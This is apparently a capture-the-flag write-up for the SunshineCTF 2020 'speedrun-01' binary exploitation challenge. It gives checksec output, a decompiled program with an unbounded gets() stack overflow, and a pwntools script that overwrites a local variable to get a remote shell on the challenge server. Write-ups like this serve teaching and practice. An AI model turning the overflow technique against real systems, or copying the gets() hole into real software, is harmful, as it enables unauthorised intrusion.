# **speedrun-01**
## Task
nc chal.2020.sunshinectf.org 30001
File: chall_01
Tag: binary exploitation 

## Solution
### Checksec
```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled

```
* No cannary assume BOF 
* System 64 bit
### Decompile with ghidra
```c
void main(void)
{
  char local_68 [64];
  char local_28 [24];
  int local_10;
  int local_c;
  
  puts("Long time ago, you called upon the tombstones");
  fgets(local_28,0x13,stdin);
  gets(local_68);
  if (local_c == 0xfacade) {
    system("/bin/sh");
  }
  if (local_10 == 0xfacade) {
    system("/bin/sh");
  }
  return;
}
```
The same with the speedrun--00, but before `gets` we have to input `fgets` and the bytes of gadbage is `0x68-0xc` for `local_c` and then `0xfacade`
Or do the same with `local_10`

### Exploit
```python
from pwn import *
bianry = context.binary = ELF('./chall_01')
payload = b'A'*(0x68-0xc)
payload += p64(0xfacade)
p = remote('chal.2020.sunshinectf.org',30001)
p.sendline("lol")
p.sendline(payload)
p.interactive()
```
### Output
```bash
[*] '/home/kali/speedrun_sunshineCTF2020/chall_01'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.2020.sunshinectf.org on port 30001: Done
[*] Switching to interactive mode
Long time ago, you called upon the tombstones
$ ls
chall_01
flag.txt
```